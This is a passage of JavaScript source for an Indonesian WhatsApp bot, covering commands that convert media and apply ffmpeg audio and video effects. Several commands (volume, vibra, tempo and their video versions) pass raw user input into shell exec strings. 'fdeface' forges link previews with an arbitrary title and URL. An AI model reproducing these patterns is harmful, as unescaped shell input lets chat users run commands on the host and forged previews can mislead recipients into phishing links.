for (let i = 0; i < mentioned.length; i++){
anu = []
anu.push(mentioned[i])
}
client.groupCreate(argza[0], anu)
reply(`Sukes membuat grup:\n${argza}`)
}
break*/
/*
]=====> GROUP MENU<=====[
*/

//+++++++++++++++++++++++++++++++++++++++++++++++++++++		
//LUC MENU
//CONVERT AUIO//
case 'zalgo':
if (!isRegistered) return reply( ind.noregis())
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply("text nya mana ?")
ini_txt = args.join(" ")
reply(zalgo(`${ini_txt}`))
await confirmLIMIT(sender, [angka])
case 'vapor':
if (!isRegistered) return reply( ind.noregis())
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())	
if (args.length < 1) return reply("text nya mana ?")
ini_txt = args.join(" ")
reply(vapor(`${ini_txt}`))
await confirmLIMIT(sender, [angka])
break
break 
case 'tourl':
if (!isRegistered) return reply( ind.noregis())
if (isBanned) return replysticker(banstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await client.downloadMediaMessage(boij)
res = await upload(owgi)
reply(res)
} else {
reply('kirim/reply gambar/video')
}
await confirmLIMIT(sender, [angka])
break 
case 'detikvn':
if (!isRegistered) return reply( ind.noregis())
if (isBanned) return replysticker(banstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())				
if (!isQuotedAudio) return reply('Reply audionya')
if (args.length < 1) return reply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(media)
await confirmLIMIT(sender, [angka])
break
case 'detikvideo':
if (!isRegistered) return reply( ind.noregis())
if (isBanned) return replysticker(banstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedVideo) return reply('Reply videonya')
if (args.length < 1) return reply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(media)
await confirmLIMIT(sender, [angka])
break
case 'volume':
if (!isRegistered) return reply( ind.noregis())
if (isBanned) return replysticker(banstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio) return reply('Reply audio!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await client.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
client.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(rname)
})
await confirmLIMIT(sender, [angka])
break           
case 'say':
teks = body.slice(5)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`Contoh : ${prefix}${command} ${pushname}`)
if (args.length < 1) return reply('teksnya mana kak?')
saying = teks
client.sendMessage(from, saying, text)
await confirmLIMIT(sender, [angka])
break
case 'fdeface':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
ge = args.join('')           
var pe = ge.split("|")[0];
var pen = ge.split("|")[1];
var pn = ge.split("|")[2];
var be = ge.split("|")[3];
const fde = `kirim/reply image dengan capion ${prefix}${command} link|title|desc|teks`
if (args.length < 1) return reply (fde)
const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const tipes = await client.downloadAndSaveMediaMessage(dipes)        
const bufer = fs.readFileSync(tipes)
const desc = `${pn}`
const title = `${pen}`
const url = `${pe}`
const buu = `https://${be}`
var anu = {
detectLinks: false
}
var mat = await client.generateLinkPreview(url)
mat.title = title;
mat.description = desc;
mat.jpegThumbnail = bufer;
mat.canonicalUrl = buu; 
client.sendMessage(from, mat, MessageType.extendedText, anu)
await confirmLIMIT(sender, [angka])
break     
case 'tts':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return client.sendMessage(from, `Kode bahasanya mana gan?\n Kalo Gatau Kode Bahasanya Apa Aja Ketik Saja ${prefix}bahasa`, text, {quoted: mek})
const gtts = require('./lib/bot/gtts')(args[0])
if (args.length < 2) return client.sendMessage(from, 'Textnya mana ngab', text, {quoted: mek})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 600
? reply('Textnya kebanyakan setan!!')
: gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
if (err) return reply('Gagal om:(')
client.sendMessage(from, buffer, audio, {quoted: mek, ptt:true})
fs.unlinkSync(rano)
})
})
await confirmLIMIT(sender, [angka])
break
case 'ghost':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break 
case 'vibra': 
var req = args.join(' ')
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia) 
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'gemes':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
riu = fs.readFileSync(ran)
client.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tempo':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
var req = args.join(" ")
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'nightcore':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'fast':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
uhh = fs.readFileSync(ran)
client.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'trigg':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek })
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'slow':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'bass': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend()) 
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'gemuk':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tupai':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'reverse':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
client.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', ptt:true, quoted: mek })
fs.unlinkSync(ran)
})
break
case 'toptt':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('Gagal mengkonversi audio ke ptt')
topt = fs.readFileSync(ran)
client.sendMessage(from, topt, audio, {mimetype: 'audio/mp4', quoted: mek, ptt:true})
})
await confirmLIMIT(sender, [angka])
break
case 'tomp3':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
 if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing) 
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply('❌ Gagal, pada saat mengkonversi video ke mp3 ❌')
bufferlkj = fs.readFileSync(ran)
client.sendMessage(from, bufferlkj, audio, {mimetype: 'audio/mp4', quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break 
//Case By Luc
case 'ghostvid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break 

case 'gemesvid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
 if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
riu = fs.readFileSync(ran)
client.sendMessage(from, riu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'reversevid':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isPremium && !isOwner) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
 if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'nightcorevid':
 if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
 if (isBanned) return replysticker(banstc)
 if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
 if (!isPremium && !isOwner) return replysticker(premiumstc)
 if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'triggvid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
if (!isPremium && !isOwner) return replysticker(premiumstc)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek })
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'bassvid': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend()) 
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
if (!isPremium && !isOwner) return replysticker(premiumstc)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'gemukvid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tupaivid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'fastvid':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
fs.unlinkSync(ran)
})
break
case 'vibravid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
var req = args.join(' ')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: mek })
})
await confirmLIMIT(sender, [angka])
break
case 'slowvid':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
client.sendMessage(from, hah, video, {mimetype: 'video/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await confirmLIMIT(sender, [angka])
break
case 'tempovid':
var req = args.join(' ') 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isQuotedAudio && !isQuotedVideo) return reply('Reply vnnya atau videonya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var req = args.join(' ') 
media =await client.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
